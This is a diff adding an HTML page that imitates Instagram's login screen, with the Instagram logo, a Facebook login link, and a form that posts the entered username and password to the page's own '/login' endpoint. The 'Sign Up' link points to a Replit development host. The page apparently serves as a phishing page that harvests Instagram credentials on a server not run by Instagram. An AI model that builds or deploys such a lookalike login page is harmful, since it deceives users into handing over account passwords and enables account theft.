@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-size: 14px;
+    }
+
+    .container {
+      background-color: #111;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 350px;
+      padding: 40px 40px 30px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+    }
+
+    .logo {
+      width: 180px;
+      height: auto;
+      margin-bottom: 30px;
+      user-select: none;
+      -webkit-user-drag: none;
+      filter: invert(1);
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: none;
+      border-radius: 4px;
+      background-color: #1c1c1c;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: #888;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      background-color: #222;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #405de6;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #3142c4;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #888;
+      font-size: 12px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #333;
+      margin: 0 10px;
+    }
+
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1877f2;
+      font-weight: 600;
+      margin-bottom: 15px;
+      cursor: pointer;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .facebook-login img {
+      width: 18px;
+      height: 18px;
+      margin-right: 8px;
+      filter: invert(19%) sepia(88%) saturate(3554%) hue-rotate(203deg) brightness(96%) contrast(101%);
+    }
+
+    .forgot-password {
+      color: #999;
+      font-size: 13px;
+      text-decoration: none;
+      margin-bottom: 15px;
+      display: inline-block;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    .signup-link {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />
+
+    <form action="/login" method="POST">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <input type="submit" value="Log In" />
+    </form>
+
+    <div class="divider">OR</div>
+
+    <a href="#" class="facebook-login">
+      <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
+    </a>
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+
+    <div class="footer">
+      Don't have an account? 
+      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link">Sign Up</a>
+    </div>
+  </div>
+</body>
+</html>
